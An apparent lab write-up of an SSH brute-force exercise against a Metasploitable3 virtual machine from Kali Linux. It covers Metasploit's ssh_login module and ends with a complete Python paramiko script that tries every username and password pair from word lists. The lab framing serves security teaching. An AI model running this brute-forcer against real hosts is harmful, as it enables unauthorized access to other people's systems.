# Phase 1 – Vulnerability Identification and Exploitation

In this phase, we set up the attacker and victim machines, scanned for open ports, and launched brute-force attacks to exploit SSH login using Metasploit and a custom Python script.  
The objective was to demonstrate how weak credentials can be discovered and used to gain unauthorized access.

---

## Step 1: Configure the Environment

We configured the virtual machines using VirtualBox:
- The **victim** machine is Metasploitable3.
- The **attacker** machine is Kali Linux.

Connectivity was verified between the two machines.

### 1. Victim Machine Login
![Victim Login](Imagess/Successful_login.png "Login to Metasploitable3 as vagrant")
---

### 2. Victim IP Configuration
![Victim IP](Imagess/Victim_ip.png "Checking the IP address of the victim machine (Metasploitable3)")
---

### 3. Attacker-to-Victim Ping
![Victim Ping](Imagess/Victim_Ping.png "Pinging the victim machine from Kali to confirm connectivity")
---

### 4. Attacker IP Check
![Attacker Ping](Imagess/Attacker_ping.png "Getting attacker machine’s IP address")
---

## Step 2: Use Metasploit to Perform Brute-Force

We used Metasploit's `scanner/ssh/ssh_login` module to perform a brute-force attack.

### 5. Launching Metasploit Console
![Launch Metasploit](Imagess/Launch_msfconsole.png "Opening Metasploit console on Kali")
---

### 6. Searching for SSH Login Module
![Search SSH Module](Imagess/Search_msf.png "Searching for SSH login scanner module")
---

### 7. Setting SSH Brute-force Parameters
![MSF Setting](Imagess/msf_setting.png "Setting RHOST, USER_FILE, PASS_FILE, and THREADS for SSH attack")
---

### 8. Successful SSH Login using Metasploit
![Success Login Metasploit](Imagess/msf_success_login.png "Metasploit successfully finds valid credentials")
---

### 9. Active Session Opened
![MSF Session](Imagess/msf_session.png "Metasploit session opened after successful brute-force")
---

## Step 3: Implement a Custom Script

We also wrote a Python script using the `paramiko` library to perform the attack.

### 10. Custom Python Script Brute-force

```python
import paramiko
import socket

target_ip = "192.168.150.3"
target_port = 22

with open("usernames.txt", "r") as ufile:
    usernames = [line.strip() for line in ufile.readlines()]

with open("passwords.txt", "r") as pfile:
    passwords = [line.strip() for line in pfile.readlines()]

def ssh_connect(username, password, ip, port):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(ip, port=port, username=username, password=password, timeout=5)
        print(f"[+] Success! Username: {username} Password: {password}")
        return True
    except paramiko.AuthenticationException:
        print(f"[-] Failed login with {username}:{password}")
        return False
    except socket.error as e:
        print(f"[!] Connection error: {e}")
        return False
    finally:
        client.close()

for username in usernames:
    for password in passwords:
        if ssh_connect(username, password, target_ip, target_port):
            exit()
```

![Custom Script](Imagess/custom_script.png "Python script performing SSH brute-force attack and succeeding")
---
